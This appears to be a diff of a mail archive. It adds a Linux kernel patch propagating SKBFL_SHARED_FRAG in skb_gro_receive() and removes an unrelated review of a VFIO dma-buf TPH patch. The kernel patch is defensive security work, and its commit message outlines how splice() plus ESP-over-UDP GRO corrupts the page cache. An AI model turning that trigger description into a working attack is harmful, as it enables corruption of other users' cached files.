+From c3ec785f197bf329c443aa547eb70864e2ef29ac Mon Sep 17 00:00:00 2001
+From: Sultan Alsawaf <sultan@kerneltoast.com>
+Date: Wed, 13 May 2026 21:47:51 -0700
+Subject: [PATCH] net: gro: propagate SKBFL_SHARED_FRAG in skb_gro_receive()
+
+skb_gro_receive() moves frag descriptors from the incoming skb to the
+GRO accumulator through two frag-transfer paths (the direct frag-move
+loop and the head_frag + memcpy path) without propagating the
+SKBFL_SHARED_FRAG flag from the incoming skb's shinfo->flags. As a
+result, the accumulator ends up holding references to externally owned
+or page-cache-backed pages while reporting skb_has_shared_frag() as
+false.
+
+This is the same bug class as CVE-2026-46300 (d8cfbcdd07557, "net:
+skbuff: propagate shared-frag marker through frag-transfer helpers"),
+which fixed the identical omission in __pskb_copy_fclone(),
+skb_try_coalesce(), and skb_shift(). skb_gro_receive() was missed in
+that fix since it lives in net/core/gro.c rather than net/core/skbuff.c.
+
+The impact is observable through ESP-over-UDP with UDP GRO: splice()
+attaches page-cache pages to a UDP skb, setting SKBFL_SHARED_FRAG via
+ip_append_page(). When two such datagrams are GRO-merged via
+skb_gro_receive(), the flag is dropped. After udp_rcv_segment()
+re-segments the merged GSO skb, the fresh segments carry the
+page-cache frags without the shared-frag marker. esp_input() then sees
+!skb_cloned() && !skb_has_shared_frag() and takes the skip_cow fast
+path, decrypting in place over the page-cache pages. Because AES-GCM
+CTR decryption runs before the authentication tag is verified, the
+page cache is corrupted even though the tag check subsequently fails.
+
+Fix it by propagating SKBFL_SHARED_FRAG from the incoming skb to the
+accumulator in both frag-transfer paths, matching what the skbuff.c
+helpers already do. The third path (frag_list merge at the "merge:"
+label) chains the entire incoming skb onto the accumulator's frag_list
+without moving individual frag descriptors, so each sub-skb retains
+its own flags and no propagation is needed there.
+
+Fixes: cef401de7be8 ("net: fix possible wrong checksum generation")
+Fixes: f4c50a4034e6 ("xfrm: esp: avoid in-place decrypt on shared skb frags")
+Cc: stable@vger.kernel.org
+Co-authored-by: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
+Signed-off-by: Sultan Alsawaf <sultan@kerneltoast.com>
+---
+ net/core/gro.c | 4 ++++
+ 1 file changed, 4 insertions(+)
+
+diff --git a/net/core/gro.c b/net/core/gro.c
+index 31d21de5b15a7..4ac41ced13aeb 100644
+--- a/net/core/gro.c
++++ b/net/core/gro.c
+@@ -145,6 +145,8 @@ int skb_gro_receive(struct sk_buff *p, struct sk_buff *skb)
+ 		skb_frag_off_add(frag, offset);
+ 		skb_frag_size_sub(frag, offset);
+ 
++		pinfo->flags |= skbinfo->flags & SKBFL_SHARED_FRAG;
++
+ 		/* all fragments truesize : remove (head size + sk_buff) */
+ 		new_truesize = SKB_TRUESIZE(skb_end_offset(skb));
+ 		delta_truesize = skb->truesize - new_truesize;
+@@ -176,6 +178,8 @@ int skb_gro_receive(struct sk_buff *p, struct sk_buff *skb)
+ 		memcpy(frag + 1, skbinfo->frags, sizeof(*frag) * skbinfo->nr_frags);
+ 		/* We dont need to clear skbinfo->nr_frags here */
+ 
++		pinfo->flags |= skbinfo->flags & SKBFL_SHARED_FRAG;
++
+ 		new_truesize = SKB_DATA_ALIGN(sizeof(struct sk_buff));
+ 		delta_truesize = skb->truesize - new_truesize;
+ 		skb->truesize = new_truesize;
+-- 
+2.54.0
 
 
-
-
-> On 5/13/2026 2:47 AM, Zhiping Zhang wrote:
-> > Add a dma-buf callback that returns raw TPH metadata from the exporter
-> > so peer devices can reuse the steering tag and processing hint
-> > associated with a VFIO-exported buffer. Add a new
-> > VFIO_DEVICE_FEATURE_DMA_BUF_TPH ioctl that takes the fd from
-> > VFIO_DEVICE_FEATURE_DMA_BUF along with the TPH values, validates the fd
-> > is a vfio-exported dma-buf belonging to this device, and stores the TPH
-> > metadata under memory_lock. The existing VFIO_DEVICE_FEATURE_DMA_BUF
-> > uAPI is unchanged.
-> >
-> > 8-bit ST and 16-bit Extended ST are distinct namespaces in the PCIe TPH
-> > ST table (firmware reports them as separate fields with separate
-> > validity bits in the ACPI _DSM ST table), so the uAPI carries both
-> > values along with a flags field that indicates which value(s) are
-> > valid for this device. The exporter selects the value that matches the
-> > importer's requested width and returns -EOPNOTSUPP if that width is
-> > not present, instead of substituting a value across namespaces.
-> >
-> > Publish the TPH fields under memory_lock and gate readers on a
-> > release/acquire on the flags field; this lets get_tph() run lockless
-> > and avoids inverting the memory_lock -> dma_resv_lock ordering set up
-> > by vfio_pci_dma_buf_move(). Convert the @revoked bitfield to a plain bo=
-ol
-> > so concurrent updates of @revoked (under dma_resv_lock) and the new TPH
-> > fields (under memory_lock) cannot race on a shared bitfield byte.
->
-> The commit log includes many implementation details, why not remove or si=
-mply it.
->
-> >
-> > Signed-off-by: Zhiping Zhang <zhipingz@meta.com>
-> >
-> > ---
-> >  drivers/vfio/pci/vfio_pci_core.c   |   3 +
-> >  drivers/vfio/pci/vfio_pci_dmabuf.c | 113 ++++++++++++++++++++++++++++-
-> >  drivers/vfio/pci/vfio_pci_priv.h   |  11 +++
-> >  include/linux/dma-buf.h            |  21 ++++++
-> >  include/uapi/linux/vfio.h          |  35 +++++++++
-> >  5 files changed, 182 insertions(+), 1 deletion(-)
-> >
-> > diff --git a/drivers/vfio/pci/vfio_pci_core.c b/drivers/vfio/pci/vfio_p=
-ci_core.c
-> > index 3f8d093aacf8..94aa6dd95701 100644
-> > --- a/drivers/vfio/pci/vfio_pci_core.c
-> > +++ b/drivers/vfio/pci/vfio_pci_core.c
-> > @@ -1534,6 +1534,9 @@ int vfio_pci_core_ioctl_feature(struct vfio_devic=
-e *device, u32 flags,
-> >               return vfio_pci_core_feature_token(vdev, flags, arg, args=
-z);
-> >       case VFIO_DEVICE_FEATURE_DMA_BUF:
-> >               return vfio_pci_core_feature_dma_buf(vdev, flags, arg, ar=
-gsz);
-> > +     case VFIO_DEVICE_FEATURE_DMA_BUF_TPH:
-> > +             return vfio_pci_core_feature_dma_buf_tph(vdev, flags, arg,
-> > +                                                      argsz);
-> >       default:
-> >               return -ENOTTY;
-> >       }
-> > diff --git a/drivers/vfio/pci/vfio_pci_dmabuf.c b/drivers/vfio/pci/vfio=
-_pci_dmabuf.c
-> > index f87fd32e4a01..28247602e359 100644
-> > --- a/drivers/vfio/pci/vfio_pci_dmabuf.c
-> > +++ b/drivers/vfio/pci/vfio_pci_dmabuf.c
-> > @@ -19,7 +19,23 @@ struct vfio_pci_dma_buf {
-> >       u32 nr_ranges;
-> >       struct kref kref;
-> >       struct completion comp;
-> > -     u8 revoked : 1;
-> > +     /*
-> > +      * TPH metadata published by VFIO_DEVICE_FEATURE_DMA_BUF_TPH and
-> > +      * consumed by the @get_tph dma-buf callback.
-> > +      *
-> > +      * @tph_flags is the publish/consume gate: writers populate
-> > +      * @steering_tag, @steering_tag_ext and @ph first, then store
-> > +      * @tph_flags with smp_store_release(); readers do
-> > +      * smp_load_acquire(&tph_flags) before accessing the value fields.
-> > +      * @tph_flags =3D=3D 0 means "TPH not set". Writers serialize via
-> > +      * vdev->memory_lock; readers are lockless to avoid AB-BA against
-> > +      * the dma_resv_lock held by importers.
-> > +      */
-> > +     u32 tph_flags;
->
-> As subsequent comments, can proceed without tph_flags
->
-> > +     u16 steering_tag;
-> > +     u16 steering_tag_ext;
-> > +     u8 ph;
->
-> struct dma_buf_tph {
->         union {
->                 atomic_t val;
->                 struct {
->                         u16 st_ext;
->                         u8 st;
->                         u8 ph;
->                 };
->         };
-> };
-> Set and get are done with atomic operation, no need for lock
->
-> > +     bool revoked;
-> >  };
-> >
-> >  static int vfio_pci_dma_buf_attach(struct dma_buf *dmabuf,
-> > @@ -69,6 +85,35 @@ vfio_pci_dma_buf_map(struct dma_buf_attachment *atta=
-chment,
-> >       return ret;
-> >  }
-> >
->
-> ...
->
-> >
-> > +     /**
-> > +      * @get_tph:
-> > +      * @dmabuf: DMA buffer for which to retrieve TPH metadata
-> > +      * @steering_tag: Returns the raw TPH steering tag for @st_width
-> > +      * @ph: Returns the TPH processing hint (2-bit value)
-> > +      * @st_width: Consumer's supported steering tag width in bits (8 =
-or 16)
-> > +      *
-> > +      * Return the TPH (TLP Processing Hints) metadata associated with=
- this
-> > +      * DMA buffer for the requested steering-tag width. 8-bit ST and =
-16-bit
-> > +      * Extended ST are distinct namespaces in the PCIe TPH ST table, =
-so the
-> > +      * exporter must select the value that matches @st_width and must=
- not
-> > +      * substitute one for the other.
-> > +      *
-> > +      * Return 0 on success, -EOPNOTSUPP if no metadata is available f=
-or the
-> > +      * requested width, or -EINVAL if @st_width is not 8 or 16.
-> > +      *
-> > +      * This callback is optional.
-> > +      */
-> > +     int (*get_tph)(struct dma_buf *dmabuf, u16 *steering_tag, u8 *ph,
-> > +                    u8 st_width);
->
-> how about rename steering_tag to st?
->
-> > +
-> >       /**
-> >        * @map_dma_buf:
-> >        *
-> > diff --git a/include/uapi/linux/vfio.h b/include/uapi/linux/vfio.h
-> > index 5de618a3a5ee..53b2bbd9fc1e 100644
-> > --- a/include/uapi/linux/vfio.h
-> > +++ b/include/uapi/linux/vfio.h
-> > @@ -1534,6 +1534,41 @@ struct vfio_device_feature_dma_buf {
-> >   */
-> >  #define VFIO_DEVICE_FEATURE_MIG_PRECOPY_INFOv2  12
-> >
-> > +/**
-> > + * Upon VFIO_DEVICE_FEATURE_SET associate TPH (TLP Processing Hints) m=
-etadata
-> > + * with a vfio-exported dma-buf. The dma-buf must have been created by
-> > + * VFIO_DEVICE_FEATURE_DMA_BUF on this device.
-> > + *
-> > + * dmabuf_fd is the file descriptor returned by VFIO_DEVICE_FEATURE_DM=
-A_BUF.
-> > + *
-> > + * 8-bit ST (steering_tag) and 16-bit Extended ST (steering_tag_ext) a=
-re
-> > + * distinct namespaces in the PCIe TPH ST table; userspace should popu=
-late
-> > + * the value(s) it has from the firmware ST table for this device and =
-set
-> > + * the matching VFIO_DMA_BUF_TPH_ST / VFIO_DMA_BUF_TPH_ST_EXT bit in @=
-flags.
-> > + * An importer requests a specific width and receives the matching val=
-ue;
-> > + * if the requested width is not present, the importer is told TPH is
-> > + * unavailable for this dma-buf.
-> > + *
-> > + * ph is the 2-bit TLP Processing Hint and must be in the range [0, 3].
-> > + *
-> > + * The user must set TPH on the dma-buf before the importer consumes i=
-t.
-> > + *
-> > + * Return: 0 on success, -errno on failure.
->
-> -1 and errno is set on failure.
->
-> > + */
-> > +#define VFIO_DEVICE_FEATURE_DMA_BUF_TPH 13
-> > +
-> > +#define VFIO_DMA_BUF_TPH_ST          (1 << 0)  /* steering_tag valid */
-> > +#define VFIO_DMA_BUF_TPH_ST_EXT              (1 << 1)  /* steering_tag=
-_ext valid */
->
-> It could be represented by judge whether steering_tag/ext =3D=3D 0
->
-> > +
-> > +struct vfio_device_feature_dma_buf_tph {
-> > +     __s32   dmabuf_fd;
-> > +     __u32   flags;
-> > +     __u16   steering_tag;
-> > +     __u16   steering_tag_ext;
-> > +     __u8    ph;
-> > +     __u8    reserved[3];
->
-> How about:
-> struct vfio_device_feature_dma_buf_tph {
->         __s32   dmabuf_fd;
->         __u16   st_ext;
->         __u8    st;
->         __u8    ph;
-> }
-> If st_ext is not zero means it valid, and also with st field.
->
-> Thanks
->
-> > +};
-> > +
-> >  /* -------- API for Type1 VFIO IOMMU -------- */
-> >
-> >  /**
->
+--c6LM3/lR/jigV3Rc--
 
